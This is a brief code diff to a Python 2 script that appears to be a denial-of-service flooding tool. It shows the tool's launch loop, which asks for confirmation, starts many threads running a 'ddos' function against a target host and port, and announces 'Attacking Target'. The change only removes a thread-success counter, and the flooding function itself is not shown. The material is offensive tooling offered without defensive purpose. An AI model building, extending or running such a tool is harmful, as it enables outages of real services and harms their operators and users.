@@ -124,7 +124,6 @@ else:
     print "###############################################################\x1b[39m"
     print
     yn = raw_input("\x1b[36mExecute (\x1b[32my\x1b[36m,\x1b[31mn\x1b[36m)?\x1b[39m ")
-    succeed = 0
     if yn.lower() == "y":
             for i in range(thread_count):
                 p = str(int(float(100./thread_count)*i))+"%"
@@ -133,10 +132,8 @@ else:
                     cthread = threading.Thread(target=ddos,args=(target,port))
                     cthread.daemon = True
                     cthread.start() 
-                    succeed += 1
                 except:
                     pass
-            print succeed
             print
             print "Attacking Target"
             time.sleep(1)
